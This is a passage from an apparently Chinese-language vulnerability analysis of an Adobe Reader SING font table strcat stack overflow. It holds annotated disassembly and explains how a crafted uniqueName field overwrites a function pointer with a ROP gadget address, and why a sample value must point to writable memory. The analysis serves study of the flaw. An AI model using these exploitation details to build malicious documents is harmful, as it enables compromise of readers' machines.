eax=ebp-0x110=0x0012E718-0x110=0x0012E608</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EA         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_2: [0x0012E5EC]=eax=0x0012E608,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EB         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+value1_823A850]               <span class="comment">;   eax=ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EE         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_1: [0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EF         <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_D4], <span class="number">4</span>                <span class="comment">; [ebp-0x4]=[0x0012E714]=4</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2F3         <span class="keyword">call</span>    sub_803DCF9      &lt;-------</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">******************************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9         <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                <span class="comment">; esp=0x0012E4DC,分配局部变量栈空间</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00         <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]             <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04         <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie  <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09         <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                 <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>    <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11         <span class="keyword">push</span>    <span class="number">4Ch</span>                      <span class="comment">; [0x0012E4D8]=0x4C(分配栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13         <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54  <span class="comment">; eax=0x8184A54(__security_check_cookie)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18         <span class="keyword">call</span>    __EH_prolog3_catch       <span class="comment">; [0x0012E4D4]=0x0803DD1D,ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>080481D1 __EH_prolog3_catch proc <span class="built_in">near</span>(向栈上写入SEH结构)</span><br><span class="line"></span><br><span class="line">080481D1       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E4D0]=0x8184A54(__security_check_cookie)</span></span><br><span class="line">080481D2       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]               <span class="comment">; [0x0012E4CC]=0x0012E70C,指向下一个SEH记录的指针</span></span><br><span class="line">080481D9       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; eax=esp+0xc=0x0012E4CC+0xc=0x0012E4D8</span></span><br><span class="line">080481<span class="built_in">DD</span>       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; esp=esp-[0x0012E4D8]=0x0012E4CC-0x4C=0x0012E480,再次分配局部变量栈空间</span></span><br><span class="line">080481E1       <span class="keyword">push</span> <span class="built_in">ebx</span>                            <span class="comment">; [0x0012E47C]=ebx=0x0</span></span><br><span class="line">080481E2       <span class="keyword">push</span> <span class="built_in">esi</span>                            <span class="comment">; [0x0012E478]=esi=0x0012E6D0</span></span><br><span class="line">080481E3       <span class="keyword">push</span> <span class="built_in">edi</span>                            <span class="comment">; [0x0012E474]=edi=0x4</span></span><br><span class="line">080481E4       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebp</span>          <span class="comment">; [eax]=[0x0012E4D8]=ebp=0x0012E4D8,覆盖传进来的参数0x4C</span></span><br><span class="line">080481E6       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">eax</span>                         <span class="comment">;</span></span><br><span class="line">080481E8       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x8230FB8</span>]    <span class="comment">; eax=ds:[0x8230FB8]=0x78FC1194(___security_cookie)</span></span><br><span class="line">080481ED       <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78FC1194^0x0012E4D8=0x78EEF54C</span></span><br><span class="line">080481EF       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E470]=0x78EEF54C</span></span><br><span class="line">080481F0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">esp</span>     <span class="comment">; [ebp-0x10]=[0x0012E4D8-0x10]=[0x0012E4C8]=esp=0x0012E470</span></span><br><span class="line">080481F3       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]         <span class="comment">; [0x0012E46C]=[ebp-0x4]=[0x0012E4D4]=0x0803DD1D,返回地址</span></span><br><span class="line">080481F6       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>],-<span class="number">0x1</span>     <span class="comment">; [0x0012E4D4]=0xFFFFFFFF,本来的返回地址被修改</span></span><br><span class="line">080481FD       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]      <span class="comment">; eax=ebp-0xc=0x0012E4D8-0xc=0x0012E4CC(本SEH结构地址)</span></span><br><span class="line"><span class="number">08048200</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">eax</span>            <span class="comment">; fs:[0] = 0x0012E4CC,保存当前SEH结构指针</span></span><br><span class="line"><span class="number">08048206</span>       <span class="keyword">retn</span>                                <span class="comment">; ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>0803DD1D         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]            <span class="comment">; a4: eax=[ebp+0x11c]=[0x0012E5F4]=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD23         <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]            <span class="comment">; a1: edi=[ebp+0x110]=[0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD29         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]            <span class="comment">; a2: ebx=[ebp+0x114]=[0x0012E5EC]=0x0012E608,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD2F         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_130], <span class="built_in">edi</span>          <span class="comment">; [ebp-0x28]=[0x0012E4B0]=edi=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD32         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_138], <span class="built_in">eax</span>          <span class="comment">; [ebp-0x30]=[0x0012E4A8]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD35         <span class="keyword">call</span>    sub_804172C</span><br><span class="line"><span class="symbol">.text:</span>0803DD3A         <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span>                         <span class="comment">; esi=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD3C         <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">8</span>], <span class="number">3</span>             <span class="comment">; [edi+8]=[0x0012E720]=0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x4]=[0x0012E4D8-0x4]=[0x0012E4D4]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD43         <span class="keyword">jz</span>      loc_803DF00                      <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD49         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x1c]=[0x0012E4D8-0x1c]=[0x0012E4BC]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4C         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_120], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x18]=[0x0012E4D8-0x18]=[0x0012E4C0]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F         <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">0Ch</span>], <span class="number">1</span>           <span class="comment">; [edi+0xc]=[0x0012E718+0xc]=[0x0012E724]=0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53         <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span>   <span class="comment">; [ebp-0x4]=[0x0012E4D4]=0x0-&gt;0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD57         <span class="keyword">jnz</span>     loc_803DEA9                      <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD5D         <span class="keyword">push</span>    offset aName                     <span class="comment">; "name"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD62         <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; int</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD63         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]</span><br><span class="line"><span class="symbol">.text:</span>0803DD66         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD6A         <span class="keyword">call</span>    sub_80217D7</span><br><span class="line"><span class="symbol">.text:</span>0803DD6F         <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD72         <span class="keyword">jnz</span>     short loc_803DDDD</span><br><span class="line"><span class="symbol">.text:</span>0803DD74     <span class="keyword">push</span>    offset aSing            <span class="comment">; "SING"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD79     <span class="keyword">push</span>    <span class="built_in">edi</span>                     <span class="comment">; 类对象指针(0x0012E718),第一个变量为dword_823A850加1之前的值。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7A     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; ecx为字体对象,thiscall,ecx传参</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7D     <span class="keyword">call</span>    sub_8021B06             <span class="comment">; 解析字体对象,处理SING表</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD82     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85     <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85 <span class="comment">;&#125; // starts at 803DD53</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B     <span class="keyword">jz</span>      short loc_803DDC4       <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D     <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]              <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F     <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95     <span class="keyword">jz</span>      short loc_803DD9F       <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97     <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D     <span class="keyword">jnz</span>     short loc_803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                <span class="comment">; CODE XREF: sub_803DCF9+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9F     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                       <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3     <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>   <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB     <span class="keyword">call</span>    strcat                         <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过上面的分析,我们可以知道,<code>样本</code>构造的<code>SING表</code>的<code>“uniqueName”字段</code>将栈上<code>对象(0x0012E6B0)</code>的一个<code>函数指针</code>类型的<code>成员变量(0x0012E6D0)</code>覆盖为了<code>ROPgadget(0x4A80CB38)</code>的地址。而触发点为<code>StreamHandler类</code>的<code>虚函数sub_808B116()</code>中地址<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,这条调用指令将<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)的值</code>作为调用地址,从而获得程序执行流的劫持。这个<code>函数指针的地址</code>又存储在<code>对象(0x0012E718)</code>中的一个<code>指针类型</code>的<code>成员变量(0x0012E754)</code>中。<code>虚函数sub_808B116()</code>通过传入的<code>参数对象(0x0012E718)</code>的指针,找到<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)</code>,进行函数调用,从而获得程序执行流的劫持。<br>&emsp;&emsp;所以,<code>metasploit</code>中的漏洞利用脚本,并不是通过覆盖<code>虚函数的指针</code>或<code>虚表指针</code>,以及<code>SEH结构</code>来控制程序执行流的。</p><h5 id="2-5、样本中SING表数据“0x4A8A08C6”的作用"><a href="#2-5、样本中SING表数据“0x4A8A08C6”的作用" class="headerlink" title="2.5、样本中SING表数据“0x4A8A08C6”的作用"></a>2.5、样本中SING表数据“0x4A8A08C6”的作用</h5><p>&emsp;&emsp;<code>0x4A8A08C6</code>是一个<code>地址值</code>,<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>应具有<code>可读可写</code>权限。因为,在通过<code>strcat()</code>将<code>SING表数据</code>复制到<code>栈</code>上之后,以及获得<code>程序执行流</code>的劫持之前,会对<code>此地址</code>进行<code>读写</code>,所以构造的样本中<code>此处的地址+0x1C</code>必须具有<code>可读可写</code>权限,否则会<code>触发异常</code>,通过<code>SEH链</code>进入异常处理,就无法获得程序执行流的劫持。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">******************************************************</span><br><span class="line"></span><br><span class="line">                sub_814B423()</span><br><span class="line"></span><br><span class="line">******************************************************</span><br><span class="line"><span class="symbol">.text:</span>0814B470        <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+var_4], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0814B474        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]</span><br><span class="line"><span class="symbol">.text:</span>0814B477        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span>0814B47A        <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0814B47B        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0814B47E        <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0814B47F        <span class="keyword">call</span>    sub_80DD0B3  &lt;-------</span><br><span class="line"><span class="symbol">.text:</span>0814B484        <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">18h</span></span><br><span class="line"><span class="symbol">.text:</span>0814B487        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+var_20]</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*************************************************************************************</span><br><span class="line"></span><br><span class="line">     <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>080DD0B3        <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">; [0x0012E7E8]=ebp=0x0012E838,父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0B4        <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0CCh</span>                        <span class="comment">; esp=0x0012E71C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BA        <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                     <span class="comment">; ebp=0x0012E718,本函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BE        <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie          <span class="comment">; eax=0x78FC1194</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C3        <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78EEF68C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C5        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_4], <span class="built_in">eax</span>            <span class="comment">; [ebp+0xcc] = [0x0012E7E4] = 0x78EEF68C,父函数ebp之上</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0CB        <span class="keyword">push</span>    <span class="number">104h</span>                             <span class="comment">; [esp-0x4]=[0x0012E718]=0x104,(__EH_prolog3中分配的栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D0        <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8182A36          <span class="comment">; eax=0x8182A36(__security_check_cookie函数地址)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D5        <span class="keyword">call</span>    __EH_prolog3                     <span class="comment">; [0x0012E714]=ret=0x080DD0DA</span></span><br><span class="line">........</span><br><span class="line"><span class="symbol">.text:</span>080DD2D1 loc_80DD2D1:                          </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1                              </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1        <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]</span><br><span class="line"><span class="symbol">.text:</span>080DD2D7        <span class="keyword">call</span>    sub_80172FB</span><br><span class="line"><span class="symbol">.text:</span>080DD2DC        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8], <span class="built_in">ebx</span>            <span class="comment">;   [ebp-0x18]=[0x0012E700]=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2DF        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8]            <span class="comment">;   eax=ebp-0x18=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E2        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_4: [0x0012E5F4]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E3        <span class="keyword">push</span>    <span class="built_in">ebx</span>                               <span class="comment">; arg_3: [0x0012E5F0]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E4        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]           <span class="comment">;   eax=ebp-0x110=0x0012E718-0x110=0x0012E608</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EA        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_2: [0x0012E5EC]=eax=0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EB        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+value1_823A850]    <span class="comment">;   eax=ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EE        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_1: [0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EF        <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_D4], <span class="number">4</span>     <span class="comment">; [ebp-0x4]=[0x0012E714]=4</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2F3        <span class="keyword">call</span>    sub_803DCF9      &lt;-------</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">*******************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9         <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                    <span class="comment">; esp=0x0012E4DC,分配局部变量栈空间</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00         <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                 <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04         <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie      <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09         <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                     <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>        <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11         <span class="keyword">push</span>    <span class="number">4Ch</span>                          <span class="comment">; [0x0012E4D8]=0x4C(分配栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13         <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54      <span class="comment">; eax=0x8184A54(__security_check_cookie)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18         <span class="keyword">call</span>    __EH_prolog3_catch           <span class="comment">; [0x0012E4D4]=0x0803DD1D,ret</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DD29         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]        <span 